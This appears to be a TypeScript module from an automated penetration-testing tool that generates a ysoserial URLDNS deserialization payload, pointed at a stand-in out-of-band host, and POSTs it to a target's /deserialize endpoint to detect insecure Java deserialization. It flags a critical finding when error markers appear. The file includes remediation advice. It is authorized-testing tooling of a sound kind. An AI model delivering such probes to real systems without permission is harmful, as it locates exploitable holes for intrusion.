/**
 * Deserialization capability (RED_TEAM_BUILD_SPEC §6.8) — ysoserial payload
 * generation via the red-ysoserial bridge (MIT; external jar) delivered
 * through the gated red transport. The default proof is a benign URLDNS /
 * error-differential: the endpoint deserializing attacker-controlled bytes is
 * the finding. Command-execution gadgets are destructive and never run by
 * default (spec §6.8 safety note).
 */
import type { PentestFinding } from "../../tools/pentest.js";
import type { Evidence } from "../orchestrator.js";
import { nextEvidenceId } from "../orchestrator.js";
import { loadEngines } from "./engines.js";
import type { RedCapability, RedCapabilityContext, RedHypothesis, RedValidation } from "./orchestrator/redOrchestrator.js";

/** Response markers that indicate the server deserialized our bytes. */
const DESER_MARKERS = [
  "ObjectInputStream", "readObject", "java.io.Serializable", "InvalidClassException",
  "ClassNotFoundException", "ObjectStreamException", "Serialization",
];

export interface DeserCapabilityOptions {
  /** Path to ysoserial.jar; explicit null disables the registry lookup. */
  jar?: string | null;
  /** Delivery endpoint path (default /deserialize). */
  path?: string;
  /** Marker strings proving deser handling (tests / custom labs). */
  markers?: string[];
}

export function deserCapability(opts: DeserCapabilityOptions = {}): RedCapability {
  const markers = opts.markers ?? DESER_MARKERS;
  return {
    id: "red.deser",
    applicable: (target) => /^https?:/i.test(target),
    hunt: async (target): Promise<RedHypothesis[]> => [
      { id: `HYP-DESER-${target.length}`, capability: "red.deser", target, claim: "Endpoint deserializes attacker-controlled bytes", rationale: "ysoserial URLDNS gadget probe" },
    ],
    validate: async (hyp: RedHypothesis, ctx: RedCapabilityContext): Promise<RedValidation> => {
      // Explicit null disables the registry lookup (hermetic tests / no engines).
      const jar = opts.jar !== undefined ? opts.jar : (loadEngines()?.paths.ysoserialJar ?? null);
      if (!jar) {
        return { hypothesisId: hyp.id, status: "inconclusive", claim: hyp.claim, detail: "ysoserial not installed (run npm run red:engines)", evidence: [] };
      }
      // URLDNS is the benign gadget: a DNS lookup only, no code execution.
      const gen = await ctx.bridge("red-ysoserial", "gen", { jar, gadget: "URLDNS", cmd: `red-lab-oob.example` });
      if (!gen.ok || !gen.text) {
        return { hypothesisId: hyp.id, status: "inconclusive", claim: hyp.claim, detail: `ysoserial unavailable: ${gen.error?.message ?? "no payload"}`, evidence: [] };
      }
      const payload = gen.text;
      const url = `${hyp.target.replace(/\/+$/, "")}${opts.path ?? "/deserialize"}`;
      let result;
      try {
        result = await ctx.transport.request(url, {
          method: "POST",
          headers: { "content-type": "application/octet-stream" },
          body: payload,
        });
      } catch (err) {
        return { hypothesisId: hyp.id, status: "inconclusive", claim: hyp.claim, detail: `delivery failed: ${(err as Error).message}`, evidence: [] };
      }
      const matched = markers.find((m) => result.body.includes(m));
      if (!matched) {
        return { hypothesisId: hyp.id, status: "refuted", claim: hyp.claim, detail: `delivery returned HTTP ${result.status} without a deser marker`, evidence: [] };
      }
      const evidence: Evidence[] = [
        {
          id: nextEvidenceId(),
          kind: "poc",
          at: new Date().toISOString(),
          poc: `POST ${url} (ysoserial URLDNS payload, ${payload.length} bytes)`,
          observed: `Response contains "${matched}" (HTTP ${result.status}) — the endpoint deserialized attacker-controlled bytes`,
        },
      ];
      const finding: Omit<PentestFinding, "id"> = {
        check: "red_deserialization",
        verdict: "finding",
        severity: "critical",
        title: "Insecure deserialization of user-controlled bytes",
        target: hyp.target,
        detail: evidence[0]!.observed!,
        remediation: "Never deserialize untrusted bytes; sign or validate payloads before deserialization, and pin safe gadget-free classpaths.",
      };
      return { hypothesisId: hyp.id, status: "confirmed", claim: hyp.claim, detail: evidence[0]!.observed!, evidence, finding };
    },
  };
}
